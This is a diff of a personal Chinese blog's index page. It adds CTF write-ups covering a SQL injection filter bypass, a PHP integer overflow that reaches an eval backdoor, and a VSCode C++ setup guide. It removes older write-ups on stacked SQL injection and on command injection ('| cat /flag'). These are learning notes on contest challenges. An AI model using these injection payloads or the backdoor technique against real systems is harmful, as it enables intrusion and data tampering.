@@ -143,7 +143,7 @@
         <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
         <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">19</span></a></li>
         <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">55</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">58</span></a></li>
         <li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
         <li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
       <li class="menu-item menu-item-search">
@@ -217,7 +217,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">55</span>
+          <span class="site-state-item-count">58</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -273,6 +273,418 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/63fc7f18/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Haorical">
+      <meta itemprop="description" content="ctf退役种子选手">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="中国熊猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/posts/63fc7f18/" class="post-title-link" itemprop="url">初夏赛复盘</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-06-17 19:35:13" itemprop="dateCreated datePublished" datetime="2021-06-17T19:35:13+08:00">2021-06-17</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-08-27 01:42:22" itemprop="dateModified" datetime="2021-08-27T01:42:22+08:00">2021-08-27</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">ctf学习</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/posts/63fc7f18/" class="post-meta-item leancloud_visitors" data-flag-title="初夏赛复盘" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Changyan：</span>
+    
+    
+      <a title="changyan" href="/posts/63fc7f18/#SOHUCS" itemprop="discussionUrl">
+        <span id="url::http://haorical.xyz/posts/63fc7f18/" class="cy_cmt_count" data-xid="posts/63fc7f18/" itemprop="commentCount"></span>
+      </a>
+    
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>714</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql_inject"></a>sql_inject</h2><blockquote>
+<p>过滤绕过</p>
+</blockquote>
+<p>|| 代替 or</p>
+<p>!(a&lt;&gt;a) 代替 =</p>
+<p>/**/ 代替 空格</p>
+<p>mid 代替 left right substr</p>
+<p>3’/<strong>/||/</strong>/!(1&lt;&gt;1)#</p>
+<p>3’/<strong>/||/</strong>/!(database()&lt;&gt;’cumtctf’)#</p>
+<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,1)&lt;&gt;’f’)#;</p>
+<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,34)&lt;&gt;’flag_table,no_use_table,test,users’)#;</p>
+<p>无列名注入这个有点离谱<br>直接把flag给试出来了？？？</p>
+<p>1’/<strong>/||/</strong>/(select/<strong>/(‘flag{cumtctf_sql_is_s0_e@sy}’,0)&gt;(select/</strong>/*/<strong>/from/</strong>/flag_table/<strong>/limit/</strong>/1,1));#</p>
+<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>php在64位系统中，当索引大小为9223372036854775808会溢出</p>
+<pre><code>payload:web=flag&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806
+</code></pre>
+<p>jphide:</p>
+<p>这个有GUI界面不用命令输入密码就行。</p>
+<h2 id="RCE-Me"><a href="#RCE-Me" class="headerlink" title="RCE_Me"></a>RCE_Me</h2>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/9f79bbb9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Haorical">
+      <meta itemprop="description" content="ctf退役种子选手">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="中国熊猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/posts/9f79bbb9/" class="post-title-link" itemprop="url">20210615</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-06-15 18:18:36" itemprop="dateCreated datePublished" datetime="2021-06-15T18:18:36+08:00">2021-06-15</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-08-27 01:42:22" itemprop="dateModified" datetime="2021-08-27T01:42:22+08:00">2021-08-27</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">ctf每日一题</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/posts/9f79bbb9/" class="post-meta-item leancloud_visitors" data-flag-title="20210615" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Changyan：</span>
+    
+    
+      <a title="changyan" href="/posts/9f79bbb9/#SOHUCS" itemprop="discussionUrl">
+        <span id="url::http://haorical.xyz/posts/9f79bbb9/" class="cy_cmt_count" data-xid="posts/9f79bbb9/" itemprop="commentCount"></span>
+      </a>
+    
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>853</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="蓝帽杯-2021-One-Pointer"><a href="#蓝帽杯-2021-One-Pointer" class="headerlink" title="[蓝帽杯 2021]One Pointer"></a>[蓝帽杯 2021]One Pointer</h2><p>首先下载源码，包含user.php和add_api.php代码审计</p>
+<p>add_api.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出是将cookie的data反序列化后赋值给user,抓包发现cookie有个默认的data</p>
+<p>O:4:”User”:1:{s:5:”count”;i:3;}</p>
+<p>这里利用和校赛类似的数组溢出的漏洞，将count设为9223372036854775806，实现自加1后，再赋值就会失败，进而执行eval($_GET[“backdoor”])，方便后续用蚁剑连</p>
+<p>更改一下cookie,然后用蚁剑连，发现有访问目录限制，用插件发现用不了，然后就不会了。<br>查了查，有两种方法。</p>
+<p>第一种是更改fsockopen为pfsockopen,然后再添加端口9001，然后就可以用插件连了。</p>
+<p>第二种是挺花哨的，利用fpm，反弹shell，要在服务器上监听，但我还没有公网服务器，这个暂时理解了下，没法实践。</p>
+<p>放个链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/baidu_39504221/article/details/116720875">https://blog.csdn.net/baidu_39504221/article/details/116720875</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/c150e260/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Haorical">
+      <meta itemprop="description" content="ctf退役种子选手">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="中国熊猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/posts/c150e260/" class="post-title-link" itemprop="url">VSCode简单配置C艹环境</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-06-05 16:23:24" itemprop="dateCreated datePublished" datetime="2021-06-05T16:23:24+08:00">2021-06-05</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-08-27 01:42:22" itemprop="dateModified" datetime="2021-08-27T01:42:22+08:00">2021-08-27</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%93%8E%EF%BC%8C%E6%88%91%E5%B0%B1%E6%98%AF%E7%8E%A9/" itemprop="url" rel="index"><span itemprop="name">哎，我就是玩</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/posts/c150e260/" class="post-meta-item leancloud_visitors" data-flag-title="VSCode简单配置C艹环境" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Changyan：</span>
+    
+    
+      <a title="changyan" href="/posts/c150e260/#SOHUCS" itemprop="discussionUrl">
+        <span id="url::http://haorical.xyz/posts/c150e260/" class="cy_cmt_count" data-xid="posts/c150e260/" itemprop="commentCount"></span>
+      </a>
+    
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>560</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"><a href="#百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode" class="headerlink" title="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"></a>百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode</h2><h2 id="脑子是个好东西，建议多动手才好用"><a href="#脑子是个好东西，建议多动手才好用" class="headerlink" title="脑子是个好东西，建议多动手才好用"></a>脑子是个好东西，建议多动手才好用</h2><h2 id="需要的东西已打包，还学不会，建议回家种地"><a href="#需要的东西已打包，还学不会，建议回家种地" class="headerlink" title="需要的东西已打包，还学不会，建议回家种地"></a>需要的东西已打包，还学不会，建议回家种地</h2><h2 id="VSCode在官网上下，别TM随便找到个能下的就下"><a href="#VSCode在官网上下，别TM随便找到个能下的就下" class="headerlink" title="VSCode在官网上下，别TM随便找到个能下的就下"></a>VSCode在官网上下，别TM随便找到个能下的就下</h2><blockquote>
+<p>已经帮好几个人装了VSCode，没意思，就这nt操作浪费时间实属没必要，下面详细操作，希望看到的多多传播，不要再白白耗费时间在这无意义的事上</p>
+</blockquote>
+<ol>
+<li>下载链接中的东西</li>
+</ol>
+<ul>
+<li><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1cY9v4UrhH_n61JUoQeXn0Q">https://pan.baidu.com/s/1cY9v4UrhH_n61JUoQeXn0Q</a> 提取码：upvq</p>
+</li>
+<li><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12HPe2Mh3yt-eTiA9Quai8Q">https://pan.baidu.com/s/12HPe2Mh3yt-eTiA9Quai8Q</a> 提取码：zh7k</p>
+</li>
+</ul>
+<ol start="2">
+<li><p>将mingw-w64解压后直接拖入C盘</p>
+</li>
+<li><p>新建fuck文件夹，将.vscode解压后拖入该文件夹中</p>
+</li>
+<li><p>将下面这句添加环境变量,path中新建，不会的百度</p>
+<p> C:\mingw-w64\x86_64-8.1.0-posix-seh-rt_v6-rev0\mingw64\bin</p>
+</li>
+<li><p>vscode中安装必要插件，与C++有关的建议看不懂英文的全装，看的懂的选有用的装，懒得看的也全装</p>
+</li>
+<li><p>右键fuck文件夹，选通过vscode打开,写helloworld测试</p>
+</li>
+<li><p>运行成功的皆大欢喜,不成功的重复1-6步100-200遍，还不成功的，老老实实用你的devc++</p>
+</li>
+<li><p>over</p>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1373,448 +1785,6 @@ id=0&#39; union select 1,2,3,列名 from 表名#
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/e38e795d/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Haorical">
-      <meta itemprop="description" content="ctf退役种子选手">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="中国熊猫的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/posts/e38e795d/" class="post-title-link" itemprop="url">20210518</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-05-18 17:30:10" itemprop="dateCreated datePublished" datetime="2021-05-18T17:30:10+08:00">2021-05-18</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-08-27 01:42:22" itemprop="dateModified" datetime="2021-08-27T01:42:22+08:00">2021-08-27</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">ctf每日一题</span></a>
-        </span>
-    </span>
-
-  
-    <span id="/posts/e38e795d/" class="post-meta-item leancloud_visitors" data-flag-title="20210518" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Changyan：</span>
-    
-    
-      <a title="changyan" href="/posts/e38e795d/#SOHUCS" itemprop="discussionUrl">
-        <span id="url::http://haorical.xyz/posts/e38e795d/" class="cy_cmt_count" data-xid="posts/e38e795d/" itemprop="commentCount"></span>
-      </a>
-    
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>1.8k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><blockquote>
-<p>不多数，sql注入</p>
-</blockquote>
-<p>万能密码</p>
-<pre><code>username=admin&#39;or&#39;1&#39;=&#39;1&amp;password=admin&#39;or&#39;1&#39;=&#39;1
-</code></pre>
-<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>F12 get了一个参数，穿入dog,成功</p>
-<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>各种姿势</p>
-<pre><code>1&#39;
-1&#39; #
-1&#39; or 1=1 #
-order by 2#
-order by 3#
-1&#39; union select 1,2# 
-1&#39; union select 1,2,database()# 看库名 
-1&#39;;show databases;#库名
-1&#39;;show tables;#表名
-0&#39;;desc `XXXXXX`;#查看表结构
-0&#39;;show columns from XXX;#
-0&#39;;show columns from `666666`; #(对以数字为表名的表进行操作时，需要加上`符号)
-注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符
-eg. mysql&gt; SELECT * FROM `table` WHERE `id` = &#39;123&#39; ;
-1919810931114514必须用反单引号括起来
-</code></pre>
-<h3 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h3><p>改名后爆库：因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1’ or 1=1#爆出表所有内容就可以查flag啦</p>
-<p>payload:</p>
-<pre><code>0&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#
-</code></pre>
-<h3 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h3><p>预处理+堆叠注入</p>
-<p>预处理语句：</p>
-<pre><code>PREPARE name from &#39;[my sql sequece]&#39;;   //预定义SQL语句
-EXECUTE name;  //执行预定义SQL语句
-(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句
-</code></pre>
-<p>通过变量传递：</p>
-<pre><code>SET @tn = &#39;hahaha&#39;;  //存储表名
-SET @sql = concat(&#39;select * from &#39;, @tn);  //存储SQL语句
-PREPARE name from @sql;   //预定义SQL语句
-EXECUTE name;  //执行预定义SQL语句
-(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
-</code></pre>
-<p>本题即可利用 char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。</p>
-<pre><code>char(115,101,108,101,99,116)&lt;-----&gt;&#39;select&#39;
-</code></pre>
-<p>payload1：不使用变量</p>
-<pre><code>PREPARE hacker from concat(char(115,101,108,101,99,116), &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#
-</code></pre>
-<p>payload2：使用变量</p>
-<pre><code>1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from `1919810931114514`&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#
-</code></pre>
-<p>payload3：只是用contact(),不使用char()</p>
-<pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#
-</code></pre>
-<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjw-zm/p/12359735.html">https://www.cnblogs.com/wjw-zm/p/12359735.html</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/436545a/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Haorical">
-      <meta itemprop="description" content="ctf退役种子选手">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="中国熊猫的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/posts/436545a/" class="post-title-link" itemprop="url">20210516</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-05-17 00:50:40" itemprop="dateCreated datePublished" datetime="2021-05-17T00:50:40+08:00">2021-05-17</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-08-27 01:42:22" itemprop="dateModified" datetime="2021-08-27T01:42:22+08:00">2021-08-27</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">ctf每日一题</span></a>
-        </span>
-    </span>
-
-  
-    <span id="/posts/436545a/" class="post-meta-item leancloud_visitors" data-flag-title="20210516" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Changyan：</span>
-    
-    
-      <a title="changyan" href="/posts/436545a/#SOHUCS" itemprop="discussionUrl">
-        <span id="url::http://haorical.xyz/posts/436545a/" class="cy_cmt_count" data-xid="posts/436545a/" itemprop="commentCount"></span>
-      </a>
-    
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>343</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="BUUCTF-ACTF2020-新生赛-Exec"><a href="#BUUCTF-ACTF2020-新生赛-Exec" class="headerlink" title="BUUCTF[ACTF2020 新生赛]Exec"></a>BUUCTF[ACTF2020 新生赛]Exec</h2><blockquote>
-<p>something wrong so I must use English</p>
-</blockquote>
-<p>command execustion and some strange sign</p>
-<p>just need to ping 127.0.0.1 and we can see that it is ok to connect and then we need use the pipe sign to ping like this</p>
-<pre><code>127.0.0.1 | cat /flag
-</code></pre>
-<p>| is a sign that just do the thing behind</p>
-<p>|| if the first iswrong then do the second</p>
-<p>&amp; is do both the two don’need right</p>
-<p>&amp;&amp; is A-&gt;B A must right then B will be done</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/9d3f05e0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Haorical">
-      <meta itemprop="description" content="ctf退役种子选手">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="中国熊猫的博客">
-    </span>
-      <header class="post-header">
